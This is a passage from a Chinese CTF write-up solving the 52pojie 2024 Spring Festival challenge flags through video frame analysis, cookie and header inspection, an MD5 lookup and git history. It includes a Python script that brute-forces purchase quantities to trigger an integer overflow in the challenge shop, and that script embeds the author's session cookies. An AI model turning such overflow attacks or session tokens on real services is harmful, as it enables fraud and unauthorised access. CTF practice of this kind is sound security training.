flagA~flagC，每个难度需提交对应的4个静态flag和1个动态flag</p><h3>准备工作</h3><p>本次的视频隐藏的信息有点复杂，有两个flag都需要逐帧分析，因此我们先用ffmpeg工具把视频转换为图帧<br />（我没有阿B的大会员，下载的视频是30fps的，因此r的参数是30，若下载的是60fps的，只要调整以下命令中r的参数为60就行了）</p><p><code style="font-family: SFMono-Regular, Consolas, ;">ffmpeg -i inputfile.mp4 -r 30 ./images/%1d.jpg</code></p><p>得到一文件夹的图片：<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=c40cc902&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKjE2dgxkPlO1ibavEcicScRsBXgnvdlPK9RpKe48GxR2yU4yiaFdKZpymg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>接下来就是处理那个切成了四段的二维码，<br />认真看的小伙伴应该已经发现了，这个二维码的几个帧拼在一起就是一个完整的二维码<br />使用修图软件框选太麻烦了，有的二维码部分甚至和文字的白色部分连在了一起，<br />既然我对cv领域比较熟悉，因此我还是用opencv叠加吧</p><p>下面是一个用python写的叠加小程序：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> cv2<br /><span style="color: rgb(150, 203, 254);">import</span> os<br /><br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">add_images_in_folder</span>(folder_path):<br />    <span style="color: rgb(124, 124, 124);"># Get a list of all files in the folder</span><br />    image_files = [f <span style="color: rgb(150, 203, 254);">for</span> f <span style="color: rgb(150, 203, 254);">in</span> os.listdir(folder_path) <span style="color: rgb(150, 203, 254);">if</span> f.endswith(<span style="color: rgb(168, 255, 96);">'.jpg'</span>)]<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> len(image_files) == <span style="color: rgb(255, 115, 253);">0</span>:<br />        print(<span style="color: rgb(168, 255, 96);">"No JPG images found in the folder."</span>)<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">None</span><br /><br />    <span style="color: rgb(124, 124, 124);"># Read the first image to initialize the accumulator</span><br />    result = cv2.imread(os.path.join(folder_path, image_files[<span style="color: rgb(255, 115, 253);">0</span>]))<br /><br />    <span style="color: rgb(124, 124, 124);"># Loop through the rest of the images and add them to the accumulator</span><br />    <span style="color: rgb(150, 203, 254);">for</span> image_file <span style="color: rgb(150, 203, 254);">in</span> image_files[<span style="color: rgb(255, 115, 253);">1</span>:]:<br />        image_path = os.path.join(folder_path, image_file)<br />        image = cv2.imread(image_path)<br />        result = cv2.add(result, image)<br /><br />    <span style="color: rgb(150, 203, 254);">return</span> result<br /><br />folder_path = <span style="color: rgb(168, 255, 96);">"./images"</span><br />result_image = add_images_in_folder(folder_path)<br /><br /><span style="color: rgb(150, 203, 254);">if</span> result_image <span style="color: rgb(150, 203, 254);">is</span> <span style="color: rgb(150, 203, 254);">not</span> <span style="color: rgb(198, 197, 254);">None</span>:<br />    cv2.imwrite(<span style="color: rgb(168, 255, 96);">"./result.png"</span>,result_image)<br /></code></pre><p>手动处理去除文字部分，得到完整的二维码如图：<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=80fcc8ac&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKPvRF7OdHmCWnSUukic7iaBURVsiaCEZ0fK0rGct4qXqrAEp9H4rJmhpPg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>解码得到网址：https://2024challenge.52pojie.cn/</p><h3>Flag1</h3><p>视频中出现52pojie四个字的时候，后面点阵散开处点阵缺少了一些点，而这些缺少的点就隐藏了flag1，我们用准备部分提到的“叠加小程序”对此部分帧图片进行叠加，得到可见flag</p><p>（这个flag也可以直接看，就是有点费眼【doge】）<br />拼接结果：<img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=866918ec&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKpibicJSic3mkX1sSDXHAVcvyI5skxWnfDeicIza1IEsDfMcgHrwKz9H6mg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag1{52pj2024}</span></p></blockquote><h3>Flag2</h3><p>参考去年的官方题解中flag2部分解释：</p><blockquote><p style="margin-bottom: 15px;">因为页面会自动重定向，我本来想将 X-Dynamic-Flag: flagA{Header X-52PoJie-Uid Not Found} 藏在这个重定向之前的页面的，但是我怕藏得太深了，没这么搞。</p></blockquote><p>今年的flag2果然藏在了重定向页面前......<br />访问上述二维码指向的的网页会产生重定向，打开F12打开控制台后重新访问该链接即可看到X-Flag2：</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=39de93fa&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK1m7UcfRv20FnCRHibsa7LBIK87VpKonep9z8iaob5VJOjGl9w6sRCnxw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag2{xHOpRP}</span></p></blockquote><h3>Flag3</h3><p>视频开头那段东西就是，一看到就想到了这个视频，<br />二值杂色视觉暂留效应嘛，“二值杂色”+“视觉暂留”。<br />前者是指把一个复杂的图像，按照灰度不同去四舍五入为黑与白两种噪点。后者则意味着需要借助你眼睛与脑子的时间差，去串联起前后的噪点位置的变化，让你的脑子中形成轨迹图片。<br />这玩意常用在验证码上，用来过AI的，所以只能人工看了。</p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag3{GRsgk2}</span></p></blockquote><h3>Flag4</h3><p>打开上述提到的网址，F12，查看网络，会发现有一个文件名叫做<code style="font-family: SFMono-Regular, Consolas, ;">flag4_flag10.png</code>的空白图片作为背景（实际上是透明的，浏览器看不出而已）</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">body</span> {<br />            <span style="color: rgb(255, 255, 182);">margin</span>: <span style="color: rgb(255, 115, 253);">0</span>;<br />            <span style="color: rgb(255, 255, 182);">padding</span>: <span style="color: rgb(255, 115, 253);">0</span>;<br />            <span style="color: rgb(255, 255, 182);">background</span>: url(<span style="color: rgb(168, 255, 96);">"flag4_flag10.png"</span>) white center center no-repeat;<br />            <span style="color: rgb(255, 255, 182);">background-size</span>: contain;<br />            <span style="color: rgb(255, 255, 182);">height</span>: <span style="color: rgb(255, 115, 253);">100vh</span>;<br />            <span style="color: rgb(255, 255, 182);">overflow</span>: hidden;<br />        }</code></pre><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=a5df2cc5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK4q5tlRiaNP5eMzpmfBvZLEKnNqjKWE3lrwrvcqsbRQzQicPIVzydz2zg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>下载下来使用图片应用打开即可看到flag4；<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=c05177a2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKUsQqLRaD1sLZYibfmMtY8gMAuK1G4xgiak9StOIr60fzCBwtYL8MibnqQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag4{YvJZNS}</span></p></blockquote><h3>FlagA</h3><p>同样是开上述提到的网址，F12，查看网络，输入uid登录，会发现有一个叫做<code style="font-family: SFMono-Regular, Consolas, ;">login</code>的网页写入了cookie信息<br />而cookie信息中提到了flagA<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=d49aa80c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK7iagntySrxR8wpl7PdnC0o3yaTRfJ48Fz8kjXsyfV39AKSD5bSjScFw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flagA=guFOgjwXg5haqETMpDMLPyHfY7sP5sf32rW7l3XtVr+9T+LyBKQhmslLNA==; expires=Sat, 17 Feb 2024 06:00:00 GMT; path=/; SameSite=Lax</code></p><p>看起来flagA被加密了，而且不是base64<br />但与此同时，uid好像也采用了类似的加密方式，而且网址里好像有个script API用来把cookie转换为uid（嗯？）</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">        <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">'/auth/uid'</span>).<span style="color: rgb(255, 255, 182);">then</span>(res =&gt; res.<span style="color: rgb(255, 255, 182);">text</span>()).<span style="color: rgb(255, 255, 182);">then</span>(res =&gt; {<br />            <span style="color: rgb(150, 203, 254);">if</span> (res) {<br />                <span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">querySelector</span>(<span style="color: rgb(168, 255, 96);">'#uid'</span>).textContent = res;<br />                <span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">querySelector</span>(<span style="color: rgb(168, 255, 96);">'#logout-form'</span>).style.display = <span style="color: rgb(168, 255, 96);">''</span>;<br />                <span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">querySelector</span>(<span style="color: rgb(168, 255, 96);">'#login-form'</span>).style.display = <span style="color: rgb(168, 255, 96);">'none'</span>;<br />            }<br />        });</code></pre><p>那么就好办了，我们来<span style="font-weight: 700;">偷梁换柱</span>一下，把cookie中的flagA设置到uid中，再fetch......<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6f2c6b27&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK3Pfj1ObJqTWLiap1YFy7Ft06TQfro4licYrDdOZpuvvLiaJEYEIFNjeiaA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flagA{f96a1e5e}</span></p></blockquote><p><span style="font-weight: 700;">注：flagA每10分钟刷新</span></p><h3>Flag5</h3><p>还是那个网页，F12，网页里用注释提到了Flag5<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=9f675c00&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKpyptCNUyCesyxQn7gclH1ia3HwRRGnS0TjCOchRCeqODf0lhqOMZ1ww%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>我们把style中的属性全部去掉，得到以下一串东西（用图片了，直接发论坛MD渲染会崩）：<br /><span style="color: #000;"><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=f47e9779&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKhQicpB93um2RDPFp4l4a4r0f5j0gTsDv0e2Vc2q7zDHQASePN8TyQtg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br /></span><br /><span style="color: #000000;"><br /></span><span style="color: #000;">我们暂且不管<code style="font-family: Consolas, Monaco, ;">. _ / \</code>那一堆符号（flag9的地方会说），剩下的就是flag5</span></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag5{P3prqF}</span></p></blockquote><h3>Flag6</h3><p>还是那个网页，下方有个flag6的按钮，点击进入flag6<br /><span style="color: #000000;">网页很干净，就一个按钮，点了就开始炼丹，电脑风扇呼呼响（doge）</span><br /><span style="color: #000000;"><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=cc5c2a78&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK6jsQr6gF9XU9O6m9eEMbykp49H2rGs3lS57pv7NT3YaPxjyAvkJcrw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></span><br /><span style="color: #000000;"><br /></span><br /><span style="color: #000000;">还是来看看源码吧：</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">querySelector</span>(<span style="color: rgb(168, 255, 96);">"button"</span>).<span style="color: rgb(255, 255, 182);">addEventListener</span>(<span style="color: rgb(168, 255, 96);">"click"</span>, () =&gt; {<br />  <span style="color: rgb(150, 203, 254);">const</span> t0 = <span style="color: rgb(255, 255, 182);">Date</span>.<span style="color: rgb(255, 255, 182);">now</span>();<br />  <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(255, 115, 253);">1e8</span>; i++) {<br />    <span style="color: rgb(150, 203, 254);">if</span> ((i &amp; <span style="color: rgb(255, 115, 253);">0x1ffff</span>) === <span style="color: rgb(255, 115, 253);">0x1ffff</span>) {<br />      <span style="color: rgb(150, 203, 254);">const</span> progress = i / <span style="color: rgb(255, 115, 253);">1e8</span>;<br />      <span style="color: rgb(150, 203, 254);">const</span> t = <span style="color: rgb(255, 255, 182);">Date</span>.<span style="color: rgb(255, 255, 182);">now</span>() - t0;<br />      <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<br />        <span style="color: rgb(168, 255, 96);">`<span style="color: rgb(218, 239, 163);">${(progress * <span style="color: rgb(255, 115, 253);">100</span>).toFixed(<span style="color: rgb(255, 115, 253);">2</span>)}</span>% <span style="color: rgb(218, 239, 163);">${Math.floor(<br />          t / <span style="color: rgb(255, 115, 253);">1000</span><br />        )}</span>s ETA:<span style="color: rgb(218, 239, 163);">${Math.floor(t / progress / <span style="color: rgb(255, 115, 253);">1000</span>)}</span>s`</span><br />      );<br />    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(255, 255, 182);">MD5</span>(<span style="color: rgb(255, 255, 182);">String</span>(i)) === <span style="color: rgb(168, 255, 96);">"1c450bbafad15ad87c32831fa1a616fc"</span>) {<br />      <span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">querySelector</span>(<span style="color: rgb(168, 255, 96);">"#result"</span>).textContent = <span style="color: rgb(168, 255, 96);">`flag6{<span style="color: rgb(218, 239, 163);">${i}</span>}`</span>;<br />      <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />  }<br />});</code></pre><p><span style="color: #000000;">简而言之就是它跑了一个从0到<span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 3.759em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 3.205em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.419em; height: 0px;"><span><span>10</span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span><span><span>8</span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span></span></span><span>−</span><span>1</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>108−1</span></span>的数字字符串i，当该字符串的md5为<code style="font-family: Consolas, Monaco, ;"></code></span><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: #000;">1c450bbafad15ad87c32831fa1a616fc</span><span style="color: #000;"></span></code><span style="color: #000;">时，输出</span><span style="color: #000;"><code style="font-family: Consolas, Monaco, ;">flag6{${i}}</code>，否则在console中定期输出计算进度</span><br /><span style="color: #000000;">（好家伙，暴力破解md5，真有你的）</span><br /><span style="color: #000000;"><br /></span><br /><span style="color: #000000;">直接md5彩虹表反查，发现是今天的日期，绝了......</span><br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=f6d13f13&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKqlE8YTK2mZ3f3QDTGGyJLYtQ4hr6rSicjLjh9WrFDmohnib4siawFzVRQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag6{20240217}</span></p></blockquote><h3>Flag7</h3><p>作者在视频里面留下了一个Github网址，打开发现这个：<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=9a0a5041&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKiaglsV51Sg65ITVDuqNS5Wkk0TkL0PfOOa1xgq0k3bmxE6enZDWcicvw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;">"删除不小心提交的flag内容"</p></blockquote><p>提示够明显了，我们直接点击commit寻找历史提交记录，找到了这个<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5e1a11c2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKlcdRriab0dgAgd1Xib9lRQ3xMSSByibribZxYTTbxialsYGLk0U660hqB2Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag7{Djl9NQ}</span></p></blockquote><h3>Flag8 &amp; FlagB</h3><p>2048小游戏<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ca5b9877&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK5e0LlGpx6M6mlvtzAts6QFia0NUC289IQnklEFl9e5hUWNc6NvAkTVw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>首先肯定是玩咯，轻轻松松通过玩游戏顺利拿到 flag8</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=b7f8d712&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK93zQJvCPWVtBZRyia2DcbQ8pEPzhmZFsjIRFpeLTWuZt3xrWgqaKLpA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag8{OaOjIK}</span></p></blockquote><p>接着拿剩下的金币V了作者50（doge）</p><blockquote><p style="margin-bottom: 15px;">竟然真的有人v我50，真的太感动了。作为奖励呢，我就提示你一下吧，关键词是“溢出”。</p></blockquote><p>首先想到的肯定是多买点，然后让它溢出，可惜有可能弄得太猛了，导致溢出后金币数量增加了，作者也想到了这个，购买请求直接被拦截了<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=191e9930&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKRCrNlMZQVblcico4MmCpSCxnhKqzSDHJ3j8903zJU4ZZXNnIDnsUGAQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>猜想是做了检验，即购买后金币数量不能高于现有数量。<br />手算了几个临界值，罢了，完全没用，<br />因为题目没有写明白它后端到底用的啥数据类型，因此放弃思考，直接用request组件爆破</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);"># 导入requests模块</span><br /><span style="color: rgb(150, 203, 254);">import</span> requests<br /><span style="color: rgb(150, 203, 254);">for</span> i <span style="color: rgb(150, 203, 254);">in</span> [<span style="color: rgb(255, 115, 253);">2</span> ** j <span style="color: rgb(150, 203, 254);">for</span> j <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">2</span>,<span style="color: rgb(255, 115, 253);">64</span>)]:<br />    print(i)<br />    <span style="color: rgb(124, 124, 124);"># 请求的url地址</span><br />    url = <span style="color: rgb(168, 255, 96);">'https://2024challenge.52pojie.cn/flagB/buy_item'</span><br />    <span style="color: rgb(124, 124, 124);"># 请求头</span><br />    headers = {<span style="color: rgb(168, 255, 96);">"content-type"</span>:<span style="color: rgb(168, 255, 96);">"application/x-www-form-urlencoded"</span>,<span style="color: rgb(168, 255, 96);">"cookie"</span>:<span style="color: rgb(168, 255, 96);">"Hm_lvt_46d556462595ed05e05f009cdafff31a=1707280828,1707352290,1707440981,1708065094; wzws_sessionid=gmY5MmRiY4AxODMuMTkzLjE1My4yMjCBMTNmOWIzoGXQNBg=; guFOgjwXg5haqETMpDMLPyHfY7sP5sf32rW7l3XtVr+9T+LyBKQhmslLNA==; uid=BTtCuUGDQGSkBsn/UatmT1VT4wNkVf1j4O5UsVxg9yguZA==; game2048_user_data=I1xnNzcQVLZgwF2jXweH+0MFEE3RglZSqpAhElrNkr5VWSjGb885YMYIqMyGAZJGqCFvZ1oCV50LnAJbBvQuPLM0deHxcni4v3dvVKohNEaWNui6WbpPusQ2ff13MWv7wkO1jX/cfa0fZQOJK7UtfQvrUlJD+1GqDCYs7TCYLLEtrObxDt74D2Jswg4ViV9/1o5HHtDI"</span>}<br />    <span style="color: rgb(124, 124, 124);"># payload 为传入的参数</span><br />    payload = {<span style="color: rgb(168, 255, 96);">"shop_item_id"</span>:<span style="color: rgb(255, 115, 253);">5</span>,<span style="color: rgb(168, 255, 96);">"buy_count"</span>:i}<br />    <span style="color: rgb(124, 124, 124);"># json形式，参数用json</span><br />    res = requests.post(url,data=payload,headers=headers)<br />    print(res.text)</code></pre><p>运气还不错，跑到2^62 = 4611686018427387904时返回值为<code style="font-family: SFMono-Regular, Consolas, ;">{"code":0,"msg":"OK"}</code>，也就是说买4611686018427387904个flagB时符合要求<br />（其他的要不返回<code style="font-family: SFMono-Regular, Consolas, ;">{"code":1,"msg":"购买商品之后钱怎么还变多了？不知道出什么 bug 了，暂时先拦一下 ^_^"}</code>，要不返回<code style="font-family: SFMono-Regular, Consolas, ;">{"code":1,"msg":"钱不够"}</code><br />后来尝试发现此时并未扣除任何金币，<em style="color: rgb(102, 102, 102);">猜测此时乘上任何单价都会溢出，溢出后花销值变为0</em></p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=0ba534a4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKSpUJ0ZNsqKA3bWk8SgRS46rCs27iby1Gn8ICcma1E73khgS0iboB3GSg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flagB{2a3ec954} 过期时间: 2024-02-17 12:10:00</span></p></blockquote><h3>Flag9</h3><p>之前说到的那一串符号，调节窗口大小，即可看到立体的Flag9<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=cc33939c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKsVD1IfgWzBjJc0X1dVXC2uPbRlw4oLOonj2OxChQKHI2auvkV6rAicw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag9{KHTALK}</span></p></blockquote><h3>Flag10</h3><p>和Flag4是一张图片，图片misc类嘛，首先用binwalk看看是不是有什么不对劲的地方。<br />好像还挺正常的，没有隐藏压缩包也没有藏图<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=884e19e4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKJ9IL6vJQhgx8zKxTU6sibCzQJTlmN7FchknibDiaPdjAWCx3qfjJSEe9Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p><span style="font-weight: 700;">小插曲，这边diss一波edge浏览器，打开图片链接他会自动给你跳到它这个“边缘图像查看器”，即使你选择其中的“另存为”功能保存图片，下载到的图片也是被处理过的，隐写数据就丢了！！</span><br />（“强大”？？？）</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ce2ef47c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKC6z1LWiaPQSney4xYtB58tVkBibPnvS8bfXqFNiay4tpvyyEGanWmpS7A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p><span style="font-weight: 700;">所以，做这题时 <span style="color: #ff0000;">千 万 不 要 </span>用edge下载图片！！</span><br /><img border="0" 